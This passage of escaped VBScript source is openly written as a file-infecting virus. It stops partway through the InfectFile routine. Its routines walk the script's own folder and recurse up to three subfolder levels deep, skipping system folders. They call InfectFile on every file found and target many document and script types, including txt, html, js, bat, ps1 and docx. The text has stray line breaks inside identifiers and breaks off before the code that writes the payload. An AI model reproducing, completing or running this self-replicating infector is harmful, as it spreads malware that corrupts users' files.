ng.FileSystemObject\\\")\\n    \\n    ' Get directory of this script\\n \r\n   Dim scriptDir\\n    scriptDir = fso.GetParentFolderName(selfPath)\\n    \\n    If fso.FolderExists(scriptDir) Then\\n   \r\n     Set folder = fso.GetFolder(scriptDir)\\n        Set files = folder.Files\\n        \\n        ' Infect all files in s\r\name directory\\n        For Each file In files\\n            Call InfectFile(file.Path)\\n        Next\\n        \\n        \r\n' Infect subdirectories\\n        Call InfectSubfolders(folder)\\n    End If\\nEnd Sub\\n\\nSub InfectSubfolders(folder)\\n  \r\n  Dim subfolder, files, file\\n    Dim fso: Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\\n    \\n    For Each s\r\nubfolder In folder.SubFolders\\n        ' Skip system folders\\n        If InStr(subfolder.Name, \\\"$\\\") = 0 And _\\n      \r\n     InStr(subfolder.Name, \\\"Windows\\\") = 0 And _\\n           InStr(subfolder.Name, \\\"System\\\") = 0 Then\\n           \\n\r\n            Set files = subfolder.Files\\n            For Each file In files\\n                Call InfectFile(file.Path)\r\n\\n            Next\\n            \\n            ' Recurse (limited depth)\\n            If subfolder.Depth < 3 Then\\n     \r\n           Call InfectSubfolders(subfolder)\\n            End If\\n        End If\\n    Next\\nEnd Sub\\n\\nSub InfectFile(fi\r\nlePath)\\n    Dim fso, ext, content, viralCode\\n    Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\\n    \\n    ' \r\nGet file extension\\n    ext = LCase(fso.GetExtensionName(filePath))\\n    \\n    ' Target file types (common document/scr\r\nipt types)\\n    Dim targetTypes\\n    targetTypes = Array(\\\"md\\\", \\\"txt\\\", \\\"vbs\\\", \\\"js\\\", \\\"hta\\\", \\\"html\\\", \\\"htm\\\", \r\n_\\n                        \\\"bat\\\", \\\"cmd\\\", \\\"ps1\\\", \\\"xml\\\", \\\"json\\\", \\\"cfg\\\", _\\n                        \\\"ini\\\", \\\r\n\"log\\\", \\\"csv\\\", \\\"rtf\\\", \\\"doc\\\", \\\"docx\\\")\\n    \\n 